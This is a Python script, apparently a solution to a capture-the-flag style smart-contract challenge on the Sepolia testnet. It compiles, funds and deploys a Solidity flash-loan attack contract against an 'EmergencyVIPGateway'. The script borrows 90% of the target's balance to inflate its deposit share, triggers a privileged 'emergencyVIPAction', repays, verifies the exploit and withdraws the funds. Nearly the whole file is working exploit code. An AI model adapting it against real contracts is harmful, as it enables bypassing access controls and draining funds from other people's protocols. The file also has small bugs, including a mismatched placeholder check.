# phase2/phase2.py
import os
import time
from web3 import Web3
from dotenv import load_dotenv
from solcx import compile_source, install_solc
from eth_account import Account

load_dotenv()

# ---------- CONFIG: fill these ----------
RPC_URL = os.getenv("INFURA_url") or "https://sepolia.infura.io/v3/YOUR_INFURA_KEY"
PRIVATE_KEY = os.getenv("PRIVATE_KEY") or "0xYOUR_PRIVATE_KEY"
PHASE2_ADDRESS = (
    os.getenv("PHASE2_ADDRESS") or "0xPHASE2_ADDRESS"
)
# ----------------------------------------

if (
    "YOUR_INFURA_KEY" in RPC_URL
    or "YOUR_PRIVATE_KEY" in PRIVATE_KEY
    or "PHASE2ADDRESS" in PHASE2_ADDRESS
):
    raise SystemExit(
        "Set RPC_URL, PRIVATE_KEY, PHASE2_ADDRESS in the script or environment variables before running."
    )

# ensure solc is installed
install_solc("0.8.19")

w3 = Web3(Web3.HTTPProvider(RPC_URL))
if not w3.is_connected():
    raise SystemExit("Cannot connect to RPC URL.")

chain_id = w3.eth.chain_id

acct = Account.from_key(PRIVATE_KEY)
account_address = acct.address

PHASE2_ABI = [
    {
        "anonymous": False,
        "inputs": [
            {
                "indexed": True,
                "internalType": "address",
                "name": "exploiter",
                "type": "address",
            },
            {
                "indexed": False,
                "internalType": "uint256",
                "name": "timestamp",
                "type": "uint256",
            },
        ],
        "name": "RecordAction",
        "type": "event",
    },
    {
        "anonymous": False,
        "inputs": [
            {
                "indexed": True,
                "internalType": "address",
                "name": "vipUser",
                "type": "address",
            },
            {
                "indexed": False,
                "internalType": "string",
                "name": "action",
                "type": "string",
            },
            {
                "indexed": False,
                "internalType": "uint256",
                "name": "timestamp",
                "type": "uint256",
            },
        ],
        "name": "EmergencyVIPAction",
        "type": "event",
    },
    {
        "inputs": [],
        "name": "deposit",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function",
    },
    {
        "inputs": [{"internalType": "string", "name": "action", "type": "string"}],
        "name": "emergencyVIPAction",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [{"internalType": "uint256", "name": "amount", "type": "uint256"}],
        "name": "requestFlashLoan",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [
            {"internalType": "address", "name": "contractAddress", "type": "address"}
        ],
        "name": "checkIfExploited",
        "outputs": [{"internalType": "bool", "name": "exploited", "type": "bool"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "getContractInfo",
        "outputs": [
            {"internalType": "uint256", "name": "totalBalance", "type": "uint256"},
            {"internalType": "uint256", "name": "initialBalance", "type": "uint256"},
            {
                "internalType": "uint256",
                "name": "individualCapAmount",
                "type": "uint256",
            },
        ],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [{"internalType": "uint256", "name": "amount", "type": "uint256"}],
        "name": "withdraw",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "repay",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function",
    },
]

FLASH_BORROWER_SOURCE = r"""
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IEmergencyVIPGateway {
    function deposit() external payable;
    function emergencyVIPAction(string calldata action) external;
    function requestFlashLoan(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function deposits(address user) external view returns (uint256);
    function repay() external payable; // <-- added: explicit repay function
    function getContractInfo() external view returns (uint256 totalBalance, uint256 initialBalance, uint256 individualCapAmount);
}

contract FlashBorrower {
    address public gateway;
    address public owner;
    bool public exploitComplete;

    constructor(address _gateway) payable {
        gateway = _gateway;
        owner = msg.sender; // The person who deployed this contract
    }

    function executeOperation(uint256 amount) external {
        // This is called during the flash loan
        // The gateway has reduced balance, so our deposit % is higher now
        
        // THE EXPLOIT: Call emergencyVIPAction during flash loan
        IEmergencyVIPGateway(gateway).emergencyVIPAction("EXPLOITED_VIA_FLASH_LOAN");
        exploitComplete = true;
        
        // Repay the flash loan (no fees in your new contract!)
        IEmergencyVIPGateway(gateway).repay{value: amount}();
    }

    function triggerExploit() external {
        require(msg.sender == owner, "Only owner can trigger");
        
        // Step 1: Deposit the maximum allowed (10% of initial balance)
        // We need to calculate this dynamically
        ( , , uint256 individualCap) = IEmergencyVIPGateway(gateway).getContractInfo();
        require(individualCap > 0, "No cap available");

        uint256 depositAmount = individualCap;
        require(address(this).balance >= depositAmount, "Insufficient funds in attacker contract for deposit");

        
        IEmergencyVIPGateway(gateway).deposit{value: depositAmount}();
        
        // Step 2: Calculate flash loan amount (90% of gateway balance)
        uint256 gatewayBalance = address(gateway).balance;
        uint256 loanAmount = gatewayBalance * 90 / 100;
        require(loanAmount > 0, "Loan amount zero");

        // Step 3: Request flash loan - this will trigger executeOperation
        IEmergencyVIPGateway(gateway).requestFlashLoan(loanAmount);
    }

    function cleanup() external {
        require(msg.sender == owner, "Only owner can cleanup");
        
        // Withdraw our deposit from the gateway
        uint256 ourDeposit = IEmergencyVIPGateway(gateway).deposits(address(this));
        if (ourDeposit > 0) {
            IEmergencyVIPGateway(gateway).withdraw(ourDeposit);
        }
        
        // Send all remaining ETH back to owner
        uint256 balance = address(this).balance;
        if (balance > 0) {
            (bool success, ) = payable(owner).call{value: balance}("");
            require(success, "Cleanup transfer failed");
        }
    }

    // Emergency function to withdraw everything
    function emergencyWithdraw() external {
        require(msg.sender == owner, "Only owner");
        
        // Try to withdraw from gateway first
        try IEmergencyVIPGateway(gateway).deposits(address(this)) returns (uint256 deposit) {
            if (deposit > 0) {
                IEmergencyVIPGateway(gateway).withdraw(deposit);
            }
        } catch {}
        
        // Send everything back to owner
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, "Emergency withdrawal failed");
    }

    receive() external payable {}
}
"""

def run_phase2_from_env(rpc_url=None, private_key=None, phase2_address=None):
    rpc_url = rpc_url or os.getenv("INFURA_url") or "https://sepolia.infura.io/v3/YOUR_INFURA_KEY"
    private_key = private_key or os.getenv("PRIVATE_KEY")
    phase2_address = phase2_address or os.getenv("PHASE2_ADDRESS")


    print("Compiling exploit contract...")
    compiled = compile_source(FLASH_BORROWER_SOURCE, solc_version="0.8.19")
    contract_key = next(k for k in compiled.keys() if k.endswith(":FlashBorrower"))
    flash_interface = compiled[contract_key]
    Flash_abi = flash_interface["abi"]
    Flash_bin = flash_interface["bin"]

    # Setup contract objects
    auth = w3.eth.contract(
        address=Web3.to_checksum_address(PHASE2_ADDRESS), abi=PHASE2_ABI
    )
    Flash = w3.eth.contract(abi=Flash_abi, bytecode=Flash_bin)


    def send_tx(tx):
        tx["nonce"] = w3.eth.get_transaction_count(account_address)

        if "gas" not in tx or tx["gas"] is None:
            tx["gas"] = w3.eth.estimate_gas(tx)

        base_fee = w3.eth.get_block("latest")["baseFeePerGas"]
        priority_fee = w3.to_wei(2, "gwei")
        tx["maxPriorityFeePerGas"] = priority_fee
        tx["maxFeePerGas"] = base_fee + priority_fee * 2

        tx["chainId"] = chain_id
        tx["type"] = 2

        signed = acct.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=600)
        return receipt


    print("=== STARTING VAULT EXPLOIT ===")

    # Get gateway info
    try:
        contract_info = auth.functions.getContractInfo().call()
        gateway_balance = contract_info[0]
        initial_balance = contract_info[1]
        individual_cap = contract_info[2]

        print(f"Gateway balance: {w3.from_wei(gateway_balance, 'ether')} ETH")
        print(f"Initial balance: {w3.from_wei(initial_balance, 'ether')} ETH")
        print(f"Individual cap: {w3.from_wei(individual_cap, 'ether')} ETH")

        required_funding = individual_cap + w3.to_wei(0.01, "ether")  # cap + buffer
        print(
            f"Funding exploit contract with: {w3.from_wei(required_funding, 'ether')} ETH"
        )

    except Exception as e:
        print(f"Error getting contract info: {e}")
        print("Using fallback values...")
        required_funding = w3.to_wei(0.33, "ether")  # Fallback: 0.33 ETH

    # Deploy exploit contract
    print("Deploying exploit contract...")
    construct_tx = Flash.constructor(
        Web3.to_checksum_address(PHASE2_ADDRESS)
    ).build_transaction(
        {
            "from": account_address,
            "value": required_funding,
        }
    )

    receipt = send_tx(construct_tx)
    flash_address = receipt.contractAddress
    print(f"Exploit contract deployed at {flash_address}")

    flash = w3.eth.contract(address=flash_address, abi=Flash_abi)

    # Trigger the exploit
    print("Triggering exploit...")
    try:
        tx = flash.functions.triggerExploit().build_transaction(
            {
                "from": account_address,
            }
        )
        receipt = send_tx(tx)
        print("Exploit transaction completed!")

    except Exception as e:
        print(f"Exploit failed: {e}")
        print("Attempting cleanup...")

    # Wait for processing
    time.sleep(3)


    try:
        exploited = auth.functions.checkIfExploited(
            Web3.to_checksum_address(flash_address)
        ).call()

        if exploited:
            print("VULNERABILITY EXPLOITED SUCCESSFULLY!")
        else:
            print(" Exploit failed - vulnerability not triggered")

    except Exception as e:
        print(f"Error checking exploit status: {e}")


    except Exception as e:
        print(f"Error searching events: {e}")

    print("Cleaning up - withdrawing funds...")
    try:
        cleanup_tx = flash.functions.cleanup().build_transaction(
            {
                "from": account_address,
            }
        )
        receipt = send_tx(cleanup_tx)
        print("Cleanup completed - funds returned to wallet")

    except Exception as e:
        print(f"Cleanup failed: {e}")
        print("Trying emergency withdrawal...")
        try:
            emergency_tx = flash.functions.emergencyWithdraw().build_transaction(
                {
                    "from": account_address,
                }
            )
            receipt = send_tx(emergency_tx)
            print("Emergency withdrawal completed")
        except Exception as e2:
            print(f"Emergency withdrawal also failed: {e2}")
            print(f"Manual intervention may be needed for contract: {flash_address}")
    
    return {
        "flash_contract": flash_address,
        "deploy_receipt": receipt.transactionHash.hex(),
        "exploit_success": exploited,
    }



